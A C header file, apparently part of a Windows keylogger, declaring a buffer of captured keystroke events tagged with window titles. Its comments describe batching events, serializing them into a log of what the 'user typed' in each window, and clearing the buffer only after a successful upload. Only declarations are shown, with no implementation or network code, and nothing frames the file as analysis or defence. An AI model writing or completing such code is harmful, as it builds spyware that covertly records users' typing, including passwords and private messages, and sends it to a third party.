#ifndef BUFFER_H
#define BUFFER_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

typedef struct {
    uint64_t epoch_ms;
    uint32_t title_idx;
    wchar_t   text[8]; // NUL-terminated translated text
} KEvent;

void   buf_init(void);
void   buf_push(const KEvent *ev);
size_t buf_count(void);

// True when >= 256 events are pending or the oldest event is >= 60 s old.
bool buf_should_flush(uint64_t now);

// Serializes buffered events to a heap-allocated UTF-8 text log.
// Format: "[2026-09-16 10:22:31] | Window Title |\nuser typed...\n".
// Caller frees the result (HeapFree).
char  *buf_serialize(void);

// Drops all buffered events (call only after a successful upload).
void   buf_clear(void);

#endif
